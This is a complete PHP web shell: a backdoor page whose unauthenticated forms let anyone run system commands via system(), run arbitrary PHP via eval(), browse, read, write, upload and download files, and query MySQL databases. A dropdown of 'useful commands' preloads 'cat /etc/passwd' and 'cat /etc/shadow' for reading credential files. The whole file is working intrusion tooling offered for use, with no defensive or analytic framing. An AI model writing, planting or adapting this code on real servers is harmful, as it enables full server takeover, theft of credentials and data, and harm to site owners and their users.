<?php

if(!empty($_POST['download']))
{
	if (is_readable($_POST['download']))
	{
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename="'.basename($_POST['download']).'"');
		header('Expires: 0');
		header('Cache-Control: must-revalidate');
		header('Pragma: public');
		header('Content-Length: ' . filesize($_POST['download']));
		readfile($_POST['download']);
		exit;
	}
	else
		echo '<b>Error reading file ' . $_POST['download'] . '</b>';

}

function getperms($perms)
{
	switch ($perms & 0xF000) { case 0xC000: $info = 's'; break; case 0xA000: $info = 'l'; break; case 0x8000: $info = '-'; break; case 0x6000: $info = 'b'; break; case 0x4000: $info = 'd'; break; case 0x2000: $info = 'c'; break; case 0x1000: $info = 'p'; break; default: return "[unknown]"; }
	$info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));
	$info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));
	$info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}

if(!empty($_GET['file']))
{
	echo '<b>reading file <a href="'. $_GET['file'] . '">' . realpath($_GET['file']) .'</a></b><br>';
	$strFile = @highlight_file($_GET['file'], true);
	echo '<pre>' . (($strFile === false) ? "<b>Can't open file ". $_GET['file'] . '</b>' : $strFile) .'</pre>';
}

if(isset($_GET['write']) && !empty($_POST['file']))
{
	echo '<b>wrote file '. realpath($_POST['file']) .'</b><br>';
	$success = file_put_contents($_POST['file'], $_POST['content']);
	if ($success === false) echo '<b>Error writing file ' . $_POST['file'];
}

if(!empty($_POST['php'])) { echo '<pre>'; eval($_POST['php']); echo '</pre>'; }

if(!empty($_GET['dir']))
{
	$dir = $_GET['dir'];
	if ($handle = @opendir($dir)) 
	{
		echo "<b>listing of " . realpath($dir) . "</b><br>";
		while ($x = readdir($handle))
		{
			$chemin = $dir.'/'.$x;
			echo getperms(@fileperms($chemin)) . ' ';
			if (is_dir($chemin)) echo "<a href='?dir=$chemin'>$x</a> <br>";
			else echo "<a href='?file=$chemin'>$x</a> <br>";
		}

		closedir($handle);
	}
	else
		echo "<b>Can't open directory ". realpath($dir) ."</b>";
}

if(isset($_POST['cmd'])) { echo "<pre>"; system($_POST['cmd']); echo "</pre>"; }

if(isset($_POST['upload']))
{
	if(empty($_POST['dir'])) { $_POST['dir'] = dirname(__FILE__); }

	if(!move_uploaded_file($_FILES['file_name']['tmp_name'], $_POST['dir'] . '/' . $_FILES['file_name']['name']))
	{
		var_dump($_FILES);
		echo 'upload path : ' . $_POST['dir'] . '/' . $_FILES['file_name']['name'] . '<br>';
		echo '<b>file uploading error.</b>';
	}
}

if(isset($_GET['sql']))
{
	if (!empty($_POST['database']) && !empty($_POST['server']) && !empty($_POST['port']))
	{
		$dsn = 'mysql:dbname='. $_POST['database'] .';host='. $_POST['server'] . ';port=' . $_POST['port'];
		$dbh = new PDO($dsn, $_POST['user'], $_POST['password']);
		$stmt = $dbh->query($_POST['query']);

		echo '<table border="1"><tr>';
		for ($i = 0; $i < $stmt->columnCount(); $i++) { $col = $stmt->getColumnMeta($i); echo '<td><b>'. $col['name'] .'</b></td>'; }
		echo '</tr>';

		while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
			echo '<tr>';
			foreach ($row as $value) echo '<td>'. $value .'</td>';
			echo '</tr>';
		}
		echo '</table>';
	}
}

?>

<br><hr><br>

<a href="?dir=.">browse here</a><br><br>

<form action="" METHOD="POST">
	Execute command<br>
	<select onchange="document.getElementById('cmd').value = this.value;">
		<option>Useful commands</option>
		<option>cat /etc/passwd</option>
		<option>cat /etc/shadow</option>
	</select><br>
	<input type="text" id="cmd" name="cmd" placeholder="ls -al"><input type="submit" value="go"><br>
</form>

<form action="" METHOD="POST">
	Execute PHP<br>
	<input type="text" name="php" placeholder="phpinfo();"><input type="submit" value="go">
</form>

<form enctype="multipart/form-data" action="" method="post">
	Upload file<br>
	<input name="file_name" type="file"><br>
	to dir: <input type="text" name="dir" value="." placeholder="optional path">
	<input type="submit" name="upload" value="upload">
</form>

<form action="" METHOD="POST">
	Download file<br>
	<input type="text" name="download" placeholder="filename">
	<input type="submit" value="go">
</form> 

<form action="" METHOD="GET">
	Read file<br>
	<input type="text" name="file" placeholder="filename">
	<input type="submit" value="go">
</form> 

<form action="?write" METHOD="POST">
	Write file<br>
	<input type="text" name="file" placeholder="filename"><br>
	<textarea name="content" cols="100" rows="15" placeholder="content"></textarea>
	<input type="submit" value="go">
</form> 

<form action="?sql" METHOD="POST">
	MySQL query<br>
	<input type="text" name="server" value="<?php echo (!empty($_POST['server'])) ? $_POST['server'] : '127.0.0.1'; ?>" placeholder="127.0.0.1">
	<input type="text" name="port" value="<?php echo (!empty($_POST['port'])) ? $_POST['port'] : '3306'; ?>" placeholder="3306"><br>
	<input type="text" name="user" value="<?php echo (!empty($_POST['user'])) ? $_POST['user'] : 'root'; ?>" placeholder="root">
	<input type="text" name="password" value="<?php echo (!empty($_POST['password'])) ? $_POST['password'] : ''; ?>" placeholder="password"><br>
	<input type="text" name="database" value="<?php echo (!empty($_POST['database'])) ? $_POST['database'] : ''; ?>" placeholder="database"><br>

	<textarea name="query" cols="80" rows="5" placeholder="query"></textarea>
	<input type="submit" value="go">
</form>